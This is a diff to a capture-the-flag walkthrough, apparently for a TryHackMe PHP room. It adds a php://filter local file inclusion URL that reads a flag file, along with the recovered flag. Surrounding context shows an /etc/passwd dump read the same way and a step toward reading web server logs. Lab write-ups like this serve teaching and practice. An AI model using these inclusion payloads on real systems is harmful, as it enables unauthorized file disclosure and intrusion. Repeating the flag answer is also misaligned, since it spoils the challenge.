@@ -349,6 +349,21 @@ PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
 | `php://filter/convert.base64-encode/resource=dog` | The code | You will see the code itself in Base64 | format
 
 
+
+
+```
+http://10.10.43.88/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag
+```
+
+<img width="1021" height="179" alt="image" src="https://github.com/user-attachments/assets/5732c078-d071-41a8-bab8-e2a354a91520" />
+
+
+```
+$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
+```
+
+
+
 > ## now try to see `index` main page
 
 ```
@@ -435,6 +450,7 @@ Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
 ```
+
 
 
 > ## try to access log file of website
